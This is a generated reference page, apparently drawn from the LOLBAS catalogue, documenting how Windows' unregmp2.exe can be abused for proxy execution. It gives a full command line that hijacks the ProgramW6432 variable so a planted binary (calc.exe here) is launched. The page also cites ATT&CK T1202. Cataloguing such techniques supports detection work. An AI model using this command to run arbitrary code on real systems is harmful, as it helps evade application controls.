---
parsed_by: focuslocust
source: commands
type: generated
---
# Unregmp2 Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Unregmp2.exe

Tool page: [Unregmp2.exe](../../tools/windows/unregmp2.exe.md)

### Proxy execution of binary

```text
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
```

Description:

Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Unregmp2.yml` |
| Evidence | Command preserved from source parser. |
